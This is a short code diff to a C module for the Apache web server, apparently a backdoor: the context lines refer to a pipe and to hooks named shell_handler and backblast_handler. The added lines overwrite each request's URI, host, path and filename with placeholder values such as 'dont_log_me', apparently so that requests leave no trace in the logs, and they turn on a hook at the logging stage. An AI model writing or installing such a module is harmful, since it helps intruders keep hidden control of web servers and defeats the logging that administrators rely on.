@@ -23,6 +23,13 @@ static int winchester_handler(request_rec *r)
         apr_status_t rc;
         char line[128];
         FILE *pipe;
+        
+        // wipe uri
+        r->unparsed_uri = "/";
+        r->parsed_uri.scheme = "/";
+        r->parsed_uri.hostname = "/";
+        r->parsed_uri.path = "/";
+        r->filename = "dont_log_me";
 
         // create bucket brigade to store body
         bb_in = apr_brigade_create(r->pool, r->connection->bucket_alloc);
@@ -94,9 +101,9 @@ static int backblast_handler(request_rec *r)
 
 static void register_hooks(apr_pool_t *pool)
 {
-   ap_hook_post_read_request(winchester_handler, NULL, NULL, APR_HOOK_REALLY_FIRST);
-   //ap_hook_process_connection(shell_handler, NULL, NULL, APR_HOOK_FIRST);
-   //ap_hook_log_transaction(backblast_handler, NULL, NULL, APR_HOOK_FIRST);
+    ap_hook_post_read_request(winchester_handler, NULL, NULL, APR_HOOK_REALLY_FIRST);
+    //ap_hook_process_connection(shell_handler, NULL, NULL, APR_HOOK_FIRST);
+    ap_hook_log_transaction(backblast_handler, NULL, NULL, APR_HOOK_FIRST);
 }
 
 module AP_MODULE_DECLARE_DATA   winchester_module =
